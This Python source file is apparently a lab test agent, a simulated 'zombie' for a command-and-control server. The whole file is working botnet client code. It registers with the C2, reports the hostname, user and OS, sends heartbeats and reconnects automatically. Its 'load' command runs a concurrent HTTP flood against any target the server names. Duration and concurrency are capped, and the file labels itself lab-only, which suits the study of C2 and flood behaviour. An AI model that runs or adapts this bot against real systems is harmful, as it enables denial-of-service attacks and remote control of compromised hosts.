"""Agente de prueba (zombie simulado) para validar el servidor C2 en laboratorio."""
from __future__ import annotations

import argparse
import asyncio
import contextlib
import getpass
import json
import os
import platform
import socket
import sys
import time
import urllib.parse

HEARTBEAT_SECONDS = 10.0
CONNECT_TIMEOUT = 5.0
MAX_DURATION_S = 120
MAX_CONCURRENCY = 200


def encode(message: dict) -> bytes:
    return (json.dumps(message, ensure_ascii=False, separators=(",", ":")) + "\n").encode("utf-8")


def _as_int(value, default: int) -> int:
    try:
        return int(value)
    except (TypeError, ValueError):
        return default


def should_reconnect(exit_code: int, interval: float) -> bool:
    return interval > 0 and exit_code != 0


def build_hello(agent_id: str, secret: str = "") -> dict:
    return {
        "type": "hello",
        "agent_id": agent_id,
        "hostname": socket.gethostname(),
        "os": f"{platform.system()} {platform.release()}",
        "user": getpass.getuser(),
        "version": "0.2",
        "secret": secret,
    }


def handle_command(message: dict) -> dict:
    name = message.get("name")
    args = message.get("args") or {}
    command_id = message.get("id")
    if name == "ping":
        return {"type": "result", "id": command_id, "status": "ok", "data": {"pong": True}}
    if name == "info":
        return {
            "type": "result",
            "id": command_id,
            "status": "ok",
            "data": {
                "hostname": socket.gethostname(),
                "os": f"{platform.system()} {platform.release()} ({platform.machine()})",
                "user": getpass.getuser(),
                "python": platform.python_version(),
                "cpus": os.cpu_count(),
            },
        }
    if name == "echo":
        return {"type": "result", "id": command_id, "status": "ok", "data": {"text": args.get("text", "")}}
    return {
        "type": "result",
        "id": command_id,
        "status": "error",
        "data": {"error": f"comando no soportado: {name}"},
    }


def _host_header(host: str, port: int) -> str:
    display = f"[{host}]" if ":" in host else host
    return display if port == 80 else f"{display}:{port}"


def _build_request(host: str, path: str, port: int = 80) -> bytes:
    return (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {_host_header(host, port)}\r\n"
        "User-Agent: carga-laboratorio-UTN/0.2\r\n"
        "Accept: */*\r\n"
        "Connection: close\r\n"
        "\r\n"
    ).encode("ascii", errors="ignore")


async def _load_worker(host: str, port: int, request: bytes, deadline: float, stats: dict) -> None:
    while time.monotonic() < deadline:
        writer = None
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port), timeout=CONNECT_TIMEOUT
            )
            writer.write(request)
            await writer.drain()
            await asyncio.wait_for(reader.read(4096), timeout=CONNECT_TIMEOUT)
            stats["sent"] += 1
        except (OSError, asyncio.TimeoutError):
            stats["errors"] += 1
        finally:
            if writer is not None:
                with contextlib.suppress(Exception):
                    writer.close()


def parse_target(target: str) -> tuple[str, int, str]:
    parsed = urllib.parse.urlsplit(target)
    if parsed.scheme != "http" or not parsed.hostname:
        raise ValueError("objetivo invalido: use http://host[:puerto][/ruta]")
    host = parsed.hostname
    port = parsed.port or 80
    path = parsed.path or "/"
    if parsed.query:
        path = f"{path}?{parsed.query}"
    return host, port, path


async def run_load(target: str, duration: int, concurrency: int) -> dict:
    host, port, path = parse_target(target)
    duration = max(1, min(int(duration), MAX_DURATION_S))
    concurrency = max(1, min(int(concurrency), MAX_CONCURRENCY))
    request = _build_request(host, path, port)
    deadline = time.monotonic() + duration
    stats = {"sent": 0, "errors": 0}
    workers = [
        asyncio.create_task(_load_worker(host, port, request, deadline, stats))
        for _ in range(concurrency)
    ]
    await asyncio.gather(*workers)
    return {
        "sent": stats["sent"],
        "errors": stats["errors"],
        "duration_s": duration,
        "rps": round(stats["sent"] / duration, 1),
    }


async def _handle_load(message: dict) -> dict:
    args = message.get("args") or {}
    command_id = message.get("id")
    target = str(args.get("target", ""))
    duration = _as_int(args.get("duration"), 30)
    concurrency = _as_int(args.get("concurrency"), 20)
    print(f"[test-agent] inundacion: {target} durante {duration}s con {concurrency} conexiones")
    try:
        data = await run_load(target, duration, concurrency)
    except Exception as exc:
        return {"type": "result", "id": command_id, "status": "error", "data": {"error": str(exc)}}
    print(f"[test-agent] carga finalizada: enviadas={data['sent']} errores={data['errors']} rps={data['rps']}")
    return {"type": "result", "id": command_id, "status": "ok", "data": data}


async def run(host: str, port: int, agent_id: str, secret: str) -> int:
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port),
            timeout=CONNECT_TIMEOUT,
        )
    except (OSError, asyncio.TimeoutError) as exc:
        print(f"[test-agent] no se pudo conectar a {host}:{port}: {exc}")
        return 1
    write_lock = asyncio.Lock()

    async def send_message(message: dict) -> None:
        async with write_lock:
            writer.write(encode(message))
            await asyncio.wait_for(writer.drain(), timeout=CONNECT_TIMEOUT)

    load_task: asyncio.Task | None = None

    async def stop_load() -> None:
        nonlocal load_task
        if load_task is not None and not load_task.done():
            load_task.cancel()
            with contextlib.suppress(asyncio.CancelledError, Exception):
                await load_task
        load_task = None

    async def run_load_command(message: dict) -> None:
        try:
            reply = await _handle_load(message)
        except asyncio.CancelledError:
            print("[test-agent] carga cancelada")
            raise
        except Exception as exc:
            reply = {
                "type": "result",
                "id": message.get("id"),
                "status": "error",
                "data": {"error": str(exc)},
            }
        with contextlib.suppress(Exception):
            await send_message(reply)

    try:
        await send_message(build_hello(agent_id, secret))
        print(f"[test-agent] conectado como {agent_id} en {host}:{port}")
        while True:
            try:
                line = await asyncio.wait_for(reader.readline(), timeout=HEARTBEAT_SECONDS)
            except asyncio.TimeoutError:
                await send_message({"type": "heartbeat", "ts": time.time()})
                continue
            if not line:
                print("[test-agent] el servidor cerro la conexion")
                return 2
            message = json.loads(line.decode("utf-8"))
            if not isinstance(message, dict):
                print("[test-agent] mensaje invalido del servidor")
                return 1
            message_type = message.get("type")
            if message_type == "bye":
                print(f"[test-agent] expulsado por el servidor: {message.get('reason', '')}")
                return 0
            if message_type == "error":
                code = message.get("code")
                if code in ("auth", "kicked"):
                    print(f"[test-agent] rechazado por el servidor: {message.get('error', code)}")
                    return 0
                if code == "busy":
                    print("[test-agent] servidor ocupado; se reintentara con espera")
                    return 1
                continue
            if message_type != "command":
                continue
            name = message.get("name")
            print(f"[test-agent] comando recibido: {name}")
            if name == "stop":
                await stop_load()
                await send_message(
                    {"type": "result", "id": message.get("id"), "status": "ok", "data": {"stopping": True}}
                )
                print("[test-agent] detenido por el servidor")
                return 0
            if name == "load":
                if load_task is not None and not load_task.done():
                    await send_message(
                        {
                            "type": "result",
                            "id": message.get("id"),
                            "status": "error",
                            "data": {"error": "carga ya en curso"},
                        }
                    )
                else:
                    load_task = asyncio.create_task(run_load_command(message))
                continue
            await send_message(handle_command(message))
    except Exception as exc:
        print(f"[test-agent] error de conexion/protocolo: {exc}")
        return 1
    finally:
        await stop_load()
        writer.close()
        with contextlib.suppress(Exception):
            await writer.wait_closed()


def main() -> int:
    parser = argparse.ArgumentParser(description="Agente de prueba para el servidor C2 (solo laboratorio)")
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=8443)
    parser.add_argument("--id", dest="agent_id", default=f"zombie-{socket.gethostname().lower()[:12]}")
    parser.add_argument("--secret", help="secreto compartido (default: C2_SHARED_SECRET)")
    parser.add_argument(
        "--reconnect",
        type=float,
        default=0.0,
        metavar="SEGUNDOS",
        help="reintentar la conexion cada N segundos si el C2 no esta disponible (0 = salir)",
    )
    args = parser.parse_args()
    secret = args.secret if args.secret is not None else os.environ.get("C2_SHARED_SECRET", "")
    if args.secret is not None:
        print(
            "[test-agent] advertencia: --secret es visible en la lista de procesos; "
            "preferir la variable de entorno C2_SHARED_SECRET"
        )
    initial_delay = max(1.0, args.reconnect) if args.reconnect > 0 else 0.0
    delay = initial_delay
    try:
        while True:
            try:
                code = asyncio.run(run(args.host, args.port, args.agent_id, secret))
            except KeyboardInterrupt:
                return 0
            except Exception as exc:
                print(f"[test-agent] error inesperado: {exc}")
                code = 1
            if not should_reconnect(code, args.reconnect):
                return code
            wait = max(1.0, min(delay, 60.0))
            print(f"[test-agent] reconectando en {wait:.0f}s (Ctrl+C para salir)")
            time.sleep(wait)
            if code == 2:
                delay = initial_delay
            else:
                delay = min(max(delay, 1.0) * 2, 60.0)
    except KeyboardInterrupt:
        return 0


if __name__ == "__main__":
    sys.exit(main())
